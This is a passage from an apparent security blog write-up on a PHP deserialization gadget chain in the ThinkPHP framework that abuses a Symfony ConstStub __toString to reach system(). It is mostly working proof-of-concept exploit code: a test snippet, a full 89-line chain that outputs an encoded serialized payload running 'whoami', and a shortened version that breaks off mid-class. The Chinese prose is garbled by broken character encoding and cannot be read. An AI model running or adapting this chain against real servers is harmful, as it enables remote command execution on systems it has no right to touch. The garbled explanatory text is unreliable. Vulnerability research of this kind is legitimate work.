<p>‰ΩÜÊòØÂú®ÂèÇÊï∞Ë∑üËøõ‰∏≠ÔºåÂèëÁé∞ËøôÈáåÊòØÈúÄË¶ÅÂ∞ÜËøô‰∏™<code>$val</code>ËÆæÁΩÆ‰∏∫ÂëΩ‰ª§ÊâßË°åÁöÑÂèÇÊï∞ÔºåÊØîÂ¶Ç<code>whoami</code>Ôºå‰ΩÜÊòØËøôÈáåÂ∞±‰∏ÄÂÆö‰ºöÊòØÂ≠óÁ¨¶‰∏≤Á±ªÂûãÁöÑÔºåÂ∞±‰∏ÄÂÆö‰∏çËÉΩÊàêÂäüË∞ÉÁî®ÔºåÈÇ£‰πàÊàëÂâçÈù¢ÁöÑPOCÊûÑÈÄ†Â∞±È°∫Â∫îË∂ãÂäøÔºåÂ∞ùËØïÂØπif‰∏≠ÁöÑËØ≠Âè•ËøõË°åÂà©Áî®ÔºåÊâÄ‰ª•ÈúÄË¶ÅÊúâ<code>.</code>ÔºåËÆ©ÁÑ∂Âêé<code>$name</code>ÁöÑÂÄº‰∏∫ÂëΩ‰ª§ÊâßË°åÂèÇÊï∞ÔºåÊâÄ‰ª•Êàë‰º†ÂèÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;fupanc.whoami&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±ËÉΩÂΩ¢Êàê‰∏Ä‰∏™<code>$visible['fupanc'][] = &quot;whoami&quot;</code>‰∫ÜÔºåÂú®ÊúÄÂêéÁöÑË∞ÉÁî®call()ÊñπÊ≥ïÊó∂ÔºåËøôÈáåÁöÑÂèÇÊï∞Â∞±ÊòØ‰º†ÈÄíÁöÑËøô‰∏™Ôºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062223659.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222319604"
	
	
></p>
<p>‰ΩÜÊòØÂëÄ‰ΩÜÊòØÔºåÈ°∫Â∫îifËØ≠Âè•ÁöÑÂêéÊûúÊòØÔºåÈáåÈù¢ÊòØ‰∏ÄÂ±ÇÊï∞ÁªÑÔºà‰πüÂ∞±ÊòØ‰ºöÁîüÊàê‰∏äÈù¢ÁªôÁöÑÁ§∫‰æãÁöÑÁªìÊûúÔºâÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062224578.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222429525"
	
	
></p>
<p>Êú¨Êù•ÊàëËøòÂæàÂÖ¥Â•ãÔºåÂàöÂ•Ω<code>call_user_func_array()</code>ÂáΩÊï∞Á¨¨‰∫å‰∏™Â∞±ÊòØÈúÄË¶Å‰∏Ä‰∏™Êï∞ÁªÑÁ±ªÂûãÔºå‰ΩÜÊòØÔºåÂú®ÁúüÊ≠£Ë∞ÉÁî®Êó∂ÔºåÊòØÂú®Â§ñÈù¢Â•ó‰∫Ü‰∏ÄÂ±ÇÊï∞ÁªÑÁöÑÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062226751.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222601693"
	
	
></p>
<p>ÊâÄ‰ª•ËøôÈáåÁúüÊ≠£Ë∞ÉÁî®Êó∂ÊòØ‰ºöÊä•ÈîôÁöÑÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062227441.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306222722392"
	
	
></p>
<p>ÊâÄ‰ª•ËøôÈáåÊòØÂ§±Ë¥•ÁöÑ„ÄÇËøòÊòØÂøÖÈ°ªË¶ÅËøõÂÖ•Âà∞else‰∏≠ÁöÑËØ≠Âè•ÂëÄÔºåËøôÊ†∑ÊâçËÉΩËµãÂÄº‰∏∫‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤Á±ªÂûãÔºå‰ªéËÄåÂèØ‰ª•ËøõË°åÂëΩ‰ª§ÊâßË°åÔºå‰ΩÜÊòØ‰∏ÄÁõ¥ÊÉ≥‰∏çÈÄöÂëÄÔºåÊÄé‰πàÂèØ‰ª•ËøôÊ†∑ËøõË°åÂë¢Ôºü</p>
<p>ÊúÄÂêéËøòÊòØÁúãÁöÑniviaÂ≠¶ÈïøÁöÑÊñáÁ´†ÔºåÈáåÈù¢ÊúâÂ¶Ç‰∏ãËØ¥Ê≥ïÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062230405.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306223038346"
	
	
></p>
<p>ÊàëÊúÄÂºÄÂßã‰πüÊòØÁúã‰∏çÊáÇÁöÑÔºåÈÄöËøáÁúãPOC‰ª•ÂèäÂÜô‰ª£Á†ÅÔºåÁªà‰∫éÁêÜËß£Âà∞‰∫Ü„ÄÇ</p>
<p>Âú®ËøôÈáåniviaÂ≠¶ÈïøÂ∞±ÊòØÂ∞Ü<code>$val</code>ËÆæÁΩÆ‰∏∫‰∫Ü‰∏Ä‰∏™ÂÆû‰æãÂåñÂØπË±°ÔºåÁÑ∂ÂêéÂú®ÂáΩÊï∞Ë∞ÉÁî®Êó∂‰ºöËß¶ÂèëtoString()ÂáΩÊï∞Ôºå‰ªéËÄåËæìÂá∫Ëøô‰∏™ÂÜÖÂÆπÔºå‰ΩÜÊòØ‰πüÊòØ‰∏ÄÁõ¥Ê≤°ÊÉ≥Ê∏ÖÊ•öÊòØÂì™ÈáåË∞ÉÁî®‰∫ÜËß¶Âèë‰∫ÜtoString()ÊñπÊ≥ïÔºåÂêéÈù¢ÊÉ≥Âà∞‰∫ÜÂëΩ‰ª§ÊâßË°åÂáΩÊï∞ÔºåÈúÄË¶ÅstringÁ±ªÂûãÔºåÈÇ£‰πàÂæàÊúâÂèØËÉΩÊòØËøô‰∏™ÁÇπÔºåÊµãËØï‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Student</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Student</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">call_user_func_array</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,[</span><span class="nv">$a</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊúÄÂêéÊàêÂäüËøõË°åÂëΩ‰ª§ÊâßË°å„ÄÇÊàêÂäüÔºåÈÇ£‰πàÂ∞±ÊòØËøôÊ†∑ËøõË°åÁöÑ„ÄÇ</p>
<p>Âπ∂‰∏îÔºåËøôÈáåÈùûÂ∏∏ÈùûÂ∏∏ÈáçË¶ÅÁöÑÊòØÔºåËøòÂàöÂ•ΩÊúâ‰∏Ä‰∏™Á±ªÁöÑtoString()ÂáΩÊï∞ÊòØÁ¨¶ÂêàËøô‰∏™Êù°‰ª∂ÁöÑÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062236245.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306223605193"
	
	
></p>
<p>toString()ÂáΩÊï∞ÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span><span class="o">:</span> <span class="nx">string</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂìáÂ°ûÔºåÂ§™Á¨¶Âêà‰∫ÜÔºåÊÄé‰πàÂ∞±‰ºöÊúâËøô‰πàÂ∑ßÁöÑÊÉÖÂÜµÂá∫Áé∞ÔºåtqlÔºåÂèàÂ≠¶Âà∞‰∏Ä‰∏™Êñ∞ÁöÑÂà©Áî®ÁÇπ„ÄÇ</p>
<p>‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî‚Äî</p>
<h6 id="ÊúÄÁªàpoc">ÊúÄÁªàPOC
</h6><p>ÂÆå‰∫ãÂÖ∑Â§áÔºåÊúÄÂêéÁöÑÂÆåÊï¥POCÂ¶Ç‰∏ãÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span><span class="lnt">89
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Symfony\Component\VarDumper\Caster</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ConstStub</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">\Symfony\Component\VarDumper\Caster\ConstStub</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rule</span><span class="o">=</span><span class="s2">&#34;fupanc&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">router</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\Route</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">option</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;var&#34;</span><span class="o">=&gt;</span><span class="p">[</span><span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\model\Pivot</span><span class="p">()],</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rest</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="s2">&#34;111&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;id&gt;&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ResourceRegister</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$registered</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$resource</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registered</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="s2">&#34;f&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">resource</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\Resource</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">\think\route\ResourceRegister</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">)));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàêÂäüÂëΩ‰ª§ÊâßË°åÔºö</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202503062244714.png"
	
	
	
	loading="lazy"
	
		alt="image-20250306224438648"
	
	
></p>
<p>ÁÆÄÂçï‰ºòÂåñ‰∫Ü‰∏Ä‰∏ãPOCÔºö</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Symfony\Component\VarDumper\Caster</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ConstStub</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$value</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">value</span><span class="o">=</span><span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Validate</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$type</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;visible&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Route</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\model</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pivot</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$visible</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$hidden</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$append</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$relation</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">visible</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;fupanc&#39;</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nx">\Symfony\Component\VarDumper\Caster\ConstStub</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hidden</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;113&#39;</span><span class="o">=&gt;</span><span class="k">true</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;fupanc.111111&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">relation</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;fupanc&#34;</span><span class="o">=&gt;</span><span class="k">new</span> <span class="nx">\think\Validate</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">think\route</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Resource</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rule</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$option</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$rest</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$router</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
